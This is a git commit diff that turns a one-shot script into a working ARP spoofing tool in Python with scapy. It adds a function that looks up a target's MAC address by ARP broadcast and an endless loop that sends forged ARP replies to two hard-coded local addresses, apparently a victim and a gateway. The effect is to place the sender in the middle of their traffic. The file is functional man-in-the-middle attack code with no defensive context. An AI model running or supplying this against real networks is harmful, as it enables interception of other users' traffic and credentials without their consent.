63f27a7cda8c9cd6c21666534ee04316279b1103
Raghav <raghuweer23@gmail.com>
2021-08-27 16:19:05 +0100

    using network scanner to collect the mac address of the target ip. Improved the output as well

--- arp_spoof.py
+++ arp_spoof.py
@@ -1,7 +1,29 @@
 #! /usr/bin/env python3
 
 import scapy.all as scapy
+import time
 
 
-packet = scapy.ARP(op=2, pdst="192.168.68.137", hwdst="00:0c:29:7a:d0:63", psrc="192.168.68.2")
-scapy.send(packet)
+def get_mac(ip):
+    arp_packet = scapy.ARP(pdst=ip)
+    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
+    arp_packet_broadcast = broadcast/arp_packet
+    answered_list = scapy.srp(arp_packet_broadcast, timeout=1, verbose=False)[0]
+
+    mac_address = answered_list[0][1].hwsrc
+    return mac_address
+
+
+def spoof(target_ip, spoof_ip):
+    mac = get_mac(target_ip)
+    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=mac, psrc=spoof_ip)
+    scapy.send(packet, verbose=False)
+
+
+count_packet = 0
+while True:
+    spoof("192.168.68.137", "192.168.68.2")
+    spoof("192.168.68.2", "192.168.68.137")
+    count_packet += 2
+    print("\r[+] Number of packets sent: " + str(count_packet), end="")
+    time.sleep(2)
